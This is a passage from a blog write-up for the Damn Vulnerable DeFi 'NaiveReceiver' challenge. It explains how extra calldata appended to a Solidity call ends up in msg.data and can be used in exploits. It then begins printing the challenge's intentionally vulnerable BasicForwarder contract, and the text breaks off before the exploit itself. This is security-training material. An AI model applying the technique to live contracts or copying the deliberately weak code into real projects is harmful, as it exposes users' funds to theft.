<style>pre{position:relative;padding-top:1.5em}.copy-button{position:absolute;top:8px;right:8px;padding:4px 8px;font-size:12px;background-color:#555;color:#fff;border:none;border-radius:4px;cursor:pointer;opacity:.8;transition:opacity .3s,background-color .3s}.copy-button:hover{opacity:1;background-color:#333}.copy-button:active{background-color:#222}</style><!doctype html><html class=position-relative itemscope itemtype=https://schema.org/WebPage lang=en data-bs-theme=auto data-palette=blue><head><script src=/assets/init/bundle.min.4bc9b5620be1dedef2e9ad2d16aa6145506c0f814cd0e5e30a592d04f6d5788f.js integrity="sha256-S8m1Ygvh3t7y6a0tFqphRVBsD4FM0OXjClktBPbVeI8=" crossorigin=anonymous></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>NaiveReceiver - S4b03ur's Website</title>
<link rel=icon href=/favicon_hu9840297221141094029.png sizes=16x16 type=image/png><link rel=icon href=/favicon_hu17946760310224212249.png sizes=32x32 type=image/png><link rel=icon href=/favicon_hu7842366266675329608.png sizes=150x150 type=image/png><link rel=apple-touch-icon href=/favicon_hu1999807634487937084.png sizes=180x180 type=image/png><link rel=icon href=/favicon_hu3021165381424674978.png sizes=192x192 type=image/png><link rel=mask-icon href=/safari-pinned-tab.svg color=#6f42c1><meta name=keywords content><meta name=description content="WriteUp for NaiveReceiver
Hello h4ck3r, welcome to the world of DeFi security! Working through challenges on Damn Vulnerable DeFi will sharpen your skills in identifying and exploiting vulnerabilities within decentralized finance protocols. Each challenge represents a specific DeFi exploit scenario, allowing you to test strategies for attacking smart contracts and understand the underlying mechanics of DeFi. If you&rsquo;re new to Solidity and DeFi principles, You might need to solve Ethernaut first to get an overview of common exploits and vulnerabilities in smart contracts, which will be essential for tackling these challenges."><meta name=twitter:card content="summary"><meta name=twitter:title content="NaiveReceiver"><meta name=twitter:description content="WriteUp for NaiveReceiver Hello h4ck3r, welcome to the world of DeFi security! Working through challenges on Damn Vulnerable DeFi will sharpen your skills in identifying and exploiting vulnerabilities within decentralized finance protocols. Each challenge represents a specific DeFi exploit scenario, allowing you to test strategies for attacking smart contracts and understand the underlying mechanics of DeFi. If you’re new to Solidity and DeFi principles, You might need to solve Ethernaut first to get an overview of common exploits and vulnerabilities in smart contracts, which will be essential for tackling these challenges."><meta name=twitter:site content="@s4bot3ur"><meta property="og:url" content="https://s4bot3ur.github.io/blogs/damn-vulnerable-defi/naivereceiver/"><meta property="og:site_name" content="S4b03ur's Website"><meta property="og:title" content="NaiveReceiver"><meta property="og:description" content="WriteUp for NaiveReceiver Hello h4ck3r, welcome to the world of DeFi security! Working through challenges on Damn Vulnerable DeFi will sharpen your skills in identifying and exploiting vulnerabilities within decentralized finance protocols. Each challenge represents a specific DeFi exploit scenario, allowing you to test strategies for attacking smart contracts and understand the underlying mechanics of DeFi. If you’re new to Solidity and DeFi principles, You might need to solve Ethernaut first to get an overview of common exploits and vulnerabilities in smart contracts, which will be essential for tackling these challenges."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="blogs"><meta property="article:published_time" content="2024-10-27T18:23:27+05:30"><meta property="article:modified_time" content="2024-10-27T20:43:09+05:30"><meta property="article:tag" content="Delegate Call"><meta property="article:tag" content="Access Control"><meta itemprop=name content="NaiveReceiver"><meta itemprop=description content="WriteUp for NaiveReceiver Hello h4ck3r, welcome to the world of DeFi security! Working through challenges on Damn Vulnerable DeFi will sharpen your skills in identifying and exploiting vulnerabilities within decentralized finance protocols. Each challenge represents a specific DeFi exploit scenario, allowing you to test strategies for attacking smart contracts and understand the underlying mechanics of DeFi. If you’re new to Solidity and DeFi principles, You might need to solve Ethernaut first to get an overview of common exploits and vulnerabilities in smart contracts, which will be essential for tackling these challenges."><meta itemprop=datePublished content="2024-10-27T18:23:27+05:30"><meta itemprop=dateModified content="2024-10-27T20:43:09+05:30"><meta itemprop=wordCount content="3474"><meta itemprop=keywords content="Delegate Call,Access Control"><meta property="og:image" content="https://s4bot3ur.github.io/images/logo.png"><meta name=twitter:image content="https://s4bot3ur.github.io/images/logo.png"><meta property="og:image:alt" content="NaiveReceiver"><meta name=twitter:image:alt content="NaiveReceiver"><link data-precache rel=stylesheet href="/assets/main/bundle.min.9d06218c05d95bcde2a81f8af6f25e845ddbae107294fc8a869792d961ca57b5.css" integrity="sha256-nQYhjAXZW83iqB+K9vJehF3brhBylPyKhpeS2WHKV7U=" crossorigin=anonymous><link data-precache rel=stylesheet href=/assets/viewer/bundle.min.8c1002839fa22c1350d6ae1eef6593120e108f973c41348be9b5065430566aaf.css integrity="sha256-jBACg5+iLBNQ1q4e72WTEg4Qj5c8QTSL6bUGVDBWaq8=" crossorigin=anonymous><html lang=en><head></head><body><script data-goatcounter=https://s4bot3ur.goatcounter.com/count async src=//gc.zgo.at/count.js></script></body></html></head><body><header class="mb-4 sticky-top"><nav class="top-app-bar shadow navbar navbar-expand-xxl"><div class=container><a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2" href=https://s4bot3ur.github.io/><picture><img class=logo alt=Logo src="https://s4bot3ur.github.io/images/logo.webp?v=9916b795052c6b6378eeabd3838be5a3" loading=lazy width=400 height=400>
</picture>S4b03ur's Website</a><div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll=true tabindex=-1 id=navbarMenus aria-labelledby=navbarMenusLabel><div class="offcanvas-header px-4 pb-0"><div class="offcanvas-title h5" id=navbarMenusLabel>S4b03ur's Website</div><button type=button class="btn-close btn-close-white" data-bs-dismiss=offcanvas data-bs-target=#navbarMenus aria-label=Close></button></div><div class="offcanvas-body p-4 pt-0 p-xxl-0"><hr class=d-xxl-none><ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto"><a class="nav-link py-2 px-0 px-xxl-2" href=https://s4bot3ur.github.io/><span class="menu-icon me-1"><i class="fa-solid fa-house"></i></span>Home</a></li><li class="nav-item col-12 col-xxl-auto dropdown px-0"><a href=# class="nav-link dropdown-toggle" id=navbarDropdownBlog role=button data-bs-toggle=dropdown aria-expanded=false><span class="menu-icon me-1"><i class="fas fa-blog"></i></span>Blog</a><ul class="dropdown-menu dropdown-menu-end" aria-labelledby=navbarDropdownBlog data-bs-popper=none><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/categories/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fa-solid fa-folder" style=color:#0581e6></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Categories</p></div></a></li><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/series/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fas fa-book" style=color:#ff5733></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Series</p></div></a></li><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/tags/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fa-solid fa-tags" style=color:#b197fc></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Tags</p></div></a></li></ul></li></ul><hr class=d-xxl-none><form class="search-bar ms-auto my-auto" action=/search/ novalidate><div class="input-group align-items-center"><span class="btn btn-search disabled position-absolute left-0 border-0 px-1"><i class="fas fa-fw fa-search fa-lg"></i>
</span><input class="my-1 form-control border-white rounded-5 search-input bg-body" name=q type=search placeholder=Search aria-label=Search required>
<span class="search-shortcut position-absolute end-0 top-0 me-2"><kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd></span></div></form><hr class=d-xxl-none><ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto"><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=fontSizeDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="fas fa-fw fa-font"></i>
<span class=d-xxl-none>Font Size</span></a><ul class="font-size-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby=fontSizeDropdown><li><button class="font-size-item dropdown-item" data-size=xs>
Extra Small</button></li><li><button class="font-size-item dropdown-item" data-size=sm>
Small</button></li><li><button class="font-size-item dropdown-item active" data-size=md>
Medium</button></li><li><button class="font-size-item dropdown-item" data-size=lg>
Large</button></li><li><button class="font-size-item dropdown-item" data-size=xl>
Extra Large</button></li></ul></li><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=paletteDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="fas fa-fw fa-palette"></i>
<span class=d-xxl-none>Palette</span></a><ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby=paletteDropdown><li class="col-4 my-1"><a role=button id=palette-blue aria-label=Blue class="btn btn-sm w-100 palette text-bg-blue" data-palette=blue></a></li><li class="col-4 my-1"><a role=button id=palette-blue-gray aria-label="Blue Gray" class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette=blue-gray></a></li><li class="col-4 my-1"><a role=button id=palette-brown aria-label=Brown class="btn btn-sm w-100 palette text-bg-brown" data-palette=brown></a></li><li class="col-4 my-1"><a role=button id=palette-cyan aria-label=Cyan class="btn btn-sm w-100 palette text-bg-cyan" data-palette=cyan></a></li><li class="col-4 my-1"><a role=button id=palette-green aria-label=Green class="btn btn-sm w-100 palette text-bg-green" data-palette=green></a></li><li class="col-4 my-1"><a role=button id=palette-indigo aria-label=Indigo class="btn btn-sm w-100 palette text-bg-indigo" data-palette=indigo></a></li><li class="col-4 my-1"><a role=button id=palette-orange aria-label=Orange class="btn btn-sm w-100 palette text-bg-orange" data-palette=orange></a></li><li class="col-4 my-1"><a role=button id=palette-pink aria-label=Pink class="btn btn-sm w-100 palette text-bg-pink" data-palette=pink></a></li><li class="col-4 my-1"><a role=button id=palette-purple aria-label=Purple class="btn btn-sm w-100 palette text-bg-purple" data-palette=purple></a></li><li class="col-4 my-1"><a role=button id=palette-red aria-label=Red class="btn btn-sm w-100 palette text-bg-red" data-palette=red></a></li><li class="col-4 my-1"><a role=button id=palette-teal aria-label=Teal class="btn btn-sm w-100 palette text-bg-teal" data-palette=teal></a></li><li class="col-4 my-1"><a role=button id=palette-yellow aria-label=Yellow class="btn btn-sm w-100 palette text-bg-yellow" data-palette=yellow></a></li></ul></li><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=modeDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="mode-icon fas fa-fw fa-adjust" id=modeIcon></i>
<span class=d-xxl-none>Mode</span></a><ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby=modeDropdown><li class=mode-item data-color-mode=light data-icon=sun><button class=dropdown-item>
<i class="mode-icon fas fa-fw fa-sun"></i> Light</button></li><li class=mode-item data-color-mode=dark data-icon=moon><button class=dropdown-item>
<i class="mode-icon fas fa-fw fa-moon"></i> Dark</button></li><li class="mode-item active" data-color-mode=auto data-icon=adjust><button class=dropdown-item>
<i class="mode-icon fas fa-fw fa-adjust"></i> Auto</button></li></ul></li></ul></div></div><div class=d-flex><button class="navbar-toggler order-5 border-0" type=button data-bs-toggle=offcanvas data-bs-target=#navbarMenus aria-controls=navbarMenus aria-expanded=false aria-label="Toggle navigation">
<i class="fas fa-ellipsis-h"></i></button></div></div></nav></header><main class="container has-sidebar" data-kind=page><script data-precache src=/js/main-init.51dc6ab512e022553d4ceaec88d3c89420f48c6feb7b70071fa413b8f91e7a20.js integrity="sha256-UdxqtRLgIlU9TOrsiNPIlCD0jG/re3AHH6QTuPkeeiA=" crossorigin=anonymous></script><div class="row content"><noscript><div class="alert alert-danger" role=alert>Your browser does not support JavaScript.</div></noscript><div class="content-posts col-xxl-8"><div class=container><nav class="row card component" aria-label=breadcrumb><div class="card-body pb-0"><ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href=/>Home</a></li><li class="breadcrumb-item text-surface"><a href>Blogs</a></li><li class="breadcrumb-item active">NaiveReceiver</li></ol></div></nav><div class="post-panel-wrapper position-relative d-flex justify-content-center"><div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1"><a class="action action-toc d-none d-xxl-block" href=#postTOC role=button title=Contents><i class="fas fa-fw fa-list-alt"></i>
</a><a class="action action-toc d-block d-xxl-none" href=#post-toc-container role=button title=Contents><i class="fas fa-fw fa-list-alt"></i>
</a><a class="action action-post-comments" href=#post-comments role=button aria-label=Comments title=Comments><i class="fas fa-fw fa-comments"></i>
</a><a id=sidebarToggler class="action action-sidebar-toggler d-none d-xxl-block" role=button title="Toggle sidebar"><i class="fas fa-fw fa-expand-alt" data-fa-transform=rotate-45></i></a></div></div><article class="row card component mb-4 post"><div class=card-header><h1 class="card-title post-title my-2">NaiveReceiver</h1></div><div class=card-body><div class="post-meta mb-3"><span class="post-date me-1 mb-1" title="created on 2024-10-27 12:53:27 +0000 UTC, updated on 2024-10-27 15:13:09 +0000 UTC.">October 27, 2024</span><span class="post-reading-time me-1 mb-1">17 min read</span><a href=/categories/blockchain/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
<i class="fas fa-fw fa-folder me-1"></i>Blockchain</a><a href=/series/damn-vulnerable-defi/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-series">
<i class="fas fa-fw fa-columns me-1"></i>Damn-Vulnerable-Defi</a><a href=/tags/access-control/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Access Control</a><a href=/tags/delegate-call/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Delegate Call</a></div><div class="mt-2 mb-3 d-block d-xxl-none"><h2 class="text-surface mb-3">Contents</h2><div id=post-toc-container></div><hr class=text-secondary></div><div class="post-content mb-3" data-bs-spy=scroll data-bs-target=#TableOfContents tabindex=0><div id=post-content-body><h1 id=writeup-for-naivereceiver data-numberify>WriteUp for NaiveReceiver<a class="anchor ms-1" href=#writeup-for-naivereceiver></a></h1><p>Hello h4ck3r, welcome to the world of DeFi security! Working through challenges on Damn Vulnerable DeFi will sharpen your skills in identifying and exploiting vulnerabilities within decentralized finance protocols. Each challenge represents a specific DeFi exploit scenario, allowing you to test strategies for attacking smart contracts and understand the underlying mechanics of DeFi. If you&rsquo;re new to Solidity and DeFi principles, You might need to solve Ethernaut first to get an overview of common exploits and vulnerabilities in smart contracts, which will be essential for tackling these challenges.</p><h3 id=key-concepts-to-learn data-numberify>Key Concepts to Learn<a class="anchor ms-1" href=#key-concepts-to-learn></a></h3><p>In Solidity, low-level calls don&rsquo;t strictly validate the calldata, which can lead to unintended behavior. For instance, if a function does not take any input parameters, you can still construct calldata that includes the function selector followed by extra data. When this function is called, it will execute successfully, and msg.data will contain the full calldata, including the extra appended data along with the function selector. This behavior can be leveraged in specific exploit scenarios, where functions process msg.data directly, potentially leading to unexpected results or vulnerabilities.</p><p>Check the below example.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>
</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=kd>contract</span> <span class=nc>Test</span><span class=p>{</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=kt>bytes</span> <span class=k>public</span> <span class=nb>data</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=kd>function</span> <span class=nf>hello</span><span class=p>()</span><span class=k>public</span><span class=p>{</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>        <span class=nb>data</span><span class=o>=</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>
</span></span><span class=line><span class=ln>11</span><span class=cl>
</span></span><span class=line><span class=ln>12</span><span class=cl><span class=kd>contract</span> <span class=nc>Test1</span><span class=p>{</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>    <span class=n>Test</span> <span class=n>test</span><span class=p>;</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_addr</span><span class=p>){</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>        <span class=n>test</span><span class=o>=</span><span class=n>Test</span><span class=p>(</span><span class=n>_addr</span><span class=p>);</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=kd>function</span> <span class=nf>call_hello</span><span class=p>()</span><span class=k>public</span><span class=p>{</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>        <span class=kt>bytes8</span> <span class=n>call_data</span><span class=o>=</span><span class=kt>bytes8</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=s>&#34;hello()&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>        <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>call_data1</span><span class=o>=</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=n>call_data</span><span class=p>);</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>        <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>,)</span><span class=o>=</span><span class=kt>address</span><span class=p>(</span><span class=n>test</span><span class=p>).</span><span class=nb>call</span><span class=p>(</span><span class=n>call_data1</span><span class=p>);</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>success</span><span class=p>,</span><span class=s>&#34;Call Failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>23</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>I suggest you to try out this example in <a href=https://remix.ethereum.org/ target=_blank rel="noopener noreferrer">remix<i class="fas fa-external-link-square-alt ms-1"></i></a> before going through the further solution.</p><p>First, deploy the <code>Test</code> contract. Then, pass the address of the deployed <code>Test</code> contract as an argument to the constructor of the <code>Test1</code> contract and deploy the <code>Test1</code> contract.</p><p>Then call the <code>call_hello()</code> function in the <code>Test1</code> contract. Once the call is successful, check the value of <code>data</code> in the <code>Test</code> contract. Now directly call the <code>hello()</code> function in the <code>Test</code> contract and once the call is successful, check the value of <code>data</code>.</p><p>You can observe that the first time you check, the value of <code>data</code> is <code>0x19ff1d210e06a53e</code>, and the second time you check, the value is <code>0x19ff1d21</code>.</p><p>The difference is that the second time we are directly calling the <code>hello()</code> function from our EOA using Remix, whereas the first time we are calling <code>hello()</code> from another contract, and in that contract, we are constructing calldata to call the <code>hello()</code> function along with some other data.</p><p>From this, we can conclude that when we send some data to a function more than the parameters it is expecting, the call won&rsquo;t be reverted.</p><p>This understanding is crucial to solve this challenge. Once you understand this, I would suggest you go through the challenge once again and try to solve it before going to the Exploit part.</p><p>If you are a person who doesn&rsquo;t know <a href=https://eips.ethereum.org/EIPS/eip-712 target=_blank rel="noopener noreferrer">EIP712<i class="fas fa-external-link-square-alt ms-1"></i></a> or <a href=https://eips.ethereum.org/EIPS/eip-3156 target=_blank rel="noopener noreferrer">EIP3156<i class="fas fa-external-link-square-alt ms-1"></i></a>, I would suggest you go through the EIPs and then try to solve the challenge.</p><h3 id=exploit data-numberify>Exploit<a class="anchor ms-1" href=#exploit></a></h3><p>The below are the source contracts.</p><ol><li><strong>BasicForwader</strong> contract</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>  1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln>  2</span><span class=cl><span class=c1>// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
</span></span></span><span class=line><span class=ln>  3</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>=</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>25</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  4</span><span class=cl>
</span></span><span class=line><span class=ln>  5</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>EIP712</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;solady/utils/EIP712.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  6</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>ECDSA</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  7</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Address</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>  8</span><span class=cl>
</span></span><span class=line><span class=ln>  9</span><span class=cl><span class=kd>interface</span> <span class=nc>IHasTrustedForwarder</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 10</span><span class=cl>    <span class=kd>function</span> <span class=nf>trustedForwarder</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>address</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 11</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln> 12</span><span class=cl>
</span></span><span class=line><span class=ln> 13</span><span class=cl><span class=kd>contract</span> <span class=nc>BasicForwarder</span> <span class=k>is</span> <span class=n>EIP712</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 14</span><span class=cl>    <span class=kd>struct</span> <span class=nc>Request</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 15</span><span class=cl>        <span class=kt>address</span> <span class=k>from</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 16</span><span class=cl>        <span class=kt>address</span> <span class=n>target</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 17</span><span class=cl>        <span class=kt>uint256</span> <span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 18</span><span class=cl>        <span class=kt>uint256</span> <span class=nb>gas</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 19</span><span class=cl>        <span class=kt>uint256</span> <span class=n>nonce</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 20</span><span class=cl>        <span class=kt>bytes</span> <span class=nb>data</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 21</span><span class=cl>        <span class=kt>uint256</span> <span class=n>deadline</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 22</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 23</span><span class=cl>
</span></span><span class=line><span class=ln> 24</span><span class=cl>    <span class=n>error</span> <span class=n>InvalidSigner</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 25</span><span class=cl>    <span class=n>error</span> <span class=n>InvalidNonce</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 26</span><span class=cl>    <span class=n>error</span> <span class=n>OldRequest</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 27</span><span class=cl>    <span class=n>error</span> <span class=n>InvalidTarget</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 28</span><span class=cl>    <span class=n>error</span> <span class=n>InvalidValue</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 29</span><span class=cl>
</span></span><span class=line><span class=ln> 30</span><span class=cl>    <span class=kt>bytes32</span> <span class=k>private</span> <span class=k>constant</span> <span class=n>_REQUEST_TYPEHASH</span> <span class=o>=</span> <span class=nb>keccak256</span><span class=p>(</span>
</span></span><span class=line><span class=ln> 31</span><span class=cl>        <span class=s>&#34;Request(address from,address target,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 deadline)&#34;</span>
</span></span><span class=line><span class=ln> 32</span><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=ln> 33</span><span class=cl>
</span></span><span class=line><span class=ln> 34</span><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=k>public</span> <span class=n>nonces</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 35</span><span class=cl>
</span></span><span class=line><span class=ln> 36</span><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=ln> 37</span><span class=cl><span class=cm>     * @notice Check request and revert when not valid. A valid request must:
</span></span></span><span class=line><span class=ln> 38</span><span class=cl><span class=cm>     * - Include the expected value
</span></span></span><span class=line><span class=ln> 39</span><span class=cl><span class=cm>     * - Not be expired
</span></span></span><span class=line><span class=ln> 40</span><span class=cl><span class=cm>     * - Include the expected nonce
</span></span></span><span class=line><span class=ln> 41</span><span class=cl><span class=cm>     * - Target a contract that accepts this forwarder
</span></span></span><span class=line><span class=ln> 42</span><span class=cl><span class=cm>     * - Be signed by the original sender (`from` field)
</span></span></span><span class=line><span class=ln> 43</span><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=ln> 44</span><span class=cl>    <span class=kd>function</span> <span class=nf>_checkRequest</span><span class=p>(</span><span class=n>Request</span> <span class=n>calldata</span> <span class=n>request</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span> <span class=n>signature</span><span class=p>)</span> <span class=k>private</span> <span class=k>view</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 45</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=nb>value</span> <span class=o>!=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>)</span> <span class=nb>revert</span> <span class=n>InvalidValue</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 46</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;</span> <span class=n>request</span><span class=p>.</span><span class=n>deadline</span><span class=p>)</span> <span class=nb>revert</span> <span class=n>OldRequest</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 47</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>nonces</span><span class=p>[</span><span class=n>request</span><span class=p>.</span><span class=k>from</span><span class=p>]</span> <span class=o>!=</span> <span class=n>request</span><span class=p>.</span><span class=n>nonce</span><span class=p>)</span> <span class=nb>revert</span> <span class=n>InvalidNonce</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 48</span><span class=cl>
</span></span><span class=line><span class=ln> 49</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>IHasTrustedForwarder</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=n>target</span><span class=p>).</span><span class=n>trustedForwarder</span><span class=p>()</span> <span class=o>!=</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>))</span> <span class=nb>revert</span> <span class=n>InvalidTarget</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 50</span><span class=cl>
</span></span><span class=line><span class=ln> 51</span><span class=cl>        <span class=kt>address</span> <span class=n>signer</span> <span class=o>=</span> <span class=n>ECDSA</span><span class=p>.</span><span class=n>recover</span><span class=p>(</span><span class=n>_hashTypedData</span><span class=p>(</span><span class=n>getDataHash</span><span class=p>(</span><span class=n>request</span><span class=p>)),</span> <span class=n>signature</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 52</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>signer</span> <span class=o>!=</span> <span class=n>request</span><span class=p>.</span><span class=k>from</span><span class=p>)</span> <span class=nb>revert</span> <span class=n>InvalidSigner</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 53</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 54</span><span class=cl>
</span></span><span class=line><span class=ln> 55</span><span class=cl>    <span class=kd>function</span> <span class=nf>execute</span><span class=p>(</span><span class=n>Request</span> <span class=n>calldata</span> <span class=n>request</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span> <span class=n>signature</span><span class=p>)</span> <span class=k>public</span> <span class=k>payable</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 56</span><span class=cl>        <span class=n>_checkRequest</span><span class=p>(</span><span class=n>request</span><span class=p>,</span> <span class=n>signature</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 57</span><span class=cl>
</span></span><span class=line><span class=ln> 58</span><span class=cl>        <span class=n>nonces</span><span class=p>[</span><span class=n>request</span><span class=p>.</span><span class=k>from</span><span class=p>]</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 59</span><span class=cl>
</span></span><span class=line><span class=ln> 60</span><span class=cl>        <span class=kt>uint256</span> <span class=n>gasLeft</span><span class=p>;</span>
